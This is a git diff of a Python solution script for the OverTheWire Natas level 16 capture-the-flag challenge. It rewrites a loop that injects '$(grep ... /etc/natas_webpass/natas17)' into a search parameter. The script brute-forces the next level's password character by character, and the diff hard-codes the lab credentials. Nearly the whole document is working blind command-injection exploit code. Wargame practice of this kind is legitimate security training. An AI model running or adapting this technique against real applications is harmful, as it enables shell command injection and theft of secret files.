@@ -1,48 +1,45 @@
+
 import requests
-import string
-from requests.auth import HTTPBasicAuth
+import time
+from string import ascii_lowercase, ascii_uppercase, digits
 
-basicAuth=HTTPBasicAuth('natas16', 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo')
-u="http://natas16.natas.labs.overthewire.org/"
+characters = ascii_lowercase + ascii_uppercase + digits
 
-# VALID_CHARS = string.digits + string.ascii_letters
-# matchingChars = ""
+username = 'natas16'
+password = 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'
 
-# for c in VALID_CHARS:
-#     payload = "$(grep " + c + " /etc/natas_webpass/natas17)zigzag"
-#     url = u + "?needle=" + payload + "&submit=Search"
+url = f'http://{username}.natas.labs.overthewire.org/'
 
-#     response = requests.get(url, auth=basicAuth, verify=False)
+session = requests.Session()
 
-#     if 'zigzag' not in response.text:
-#         print("Found a valid char : %s" % c)
-#         matchingChars += c
+seen_password = []
 
-# print("Matching chars: ", matchingChars) # matchingChars = "035789bcdghkmnqrswAGHNPQSW"
+while len(seen_password) < 32:
+    found = False
+    for character in characters:
+        attempt = ''.join(seen_password) + character
+        payload = f'anythings$(grep ^{attempt} /etc/natas_webpass/natas17)'
+        try:
+            response = session.post(
+                url,
+                data={'needle': payload},
+                auth=(username, password),
+                timeout=10
+            )
+            content = response.text
+        except requests.exceptions.RequestException as e:
+            print(f"Request failed: {e}")
+            time.sleep(1)
+            continue
+        if 'anythings' not in content:
+            # grep matched → no change → correct char
+            seen_password.append(character)
+            print(f"[+] Found so far: {''.join(seen_password)}")
+            found = True
+            break
+        time.sleep(0.1)
 
-matchingChars = "05789bhjkoqsvwCEFHJLNOT"
-password="" # start with blank password
-
-while True:
-    for c in matchingChars:
-        payload = "$(grep " + password + c + " /etc/natas_webpass/natas17)zigzag"
-        url = u + "?needle=" + payload + "&submit=Search"
-        response = requests.get(url, auth=basicAuth, verify=False)
-
-        if 'zigzag' not in response.text:
-            print("Found a valid char : %s" % (password+c))
-            password += c
-
-        # If you get stuck in this loop, stop the script, comment out the loops at 11 and 25, set matchingChars, then re-run.
-
-# After the first loop, the value will be:
-# password = "0GWbn5rd9S7GmAdgQNdkhPkq9cw"
-while True:
-    for c in matchingChars:
-        payload = "$(grep " + c + password + " /etc/natas_webpass/natas17)zigzag"
-        url = u + "?needle=" + payload + "&submit=Search"
-        response = requests.get(url, auth=basicAuth, verify=False)
-
-        if 'zigzag' not in response.text:
-            print("Found a valid char : %s" % (c+password))
-            password = c + password
+    if not found:
+        print("[-] No matching character found. This shouldn't happen!")
+        break
+print(f"[✓] Final password: {''.join(seen_password)}")
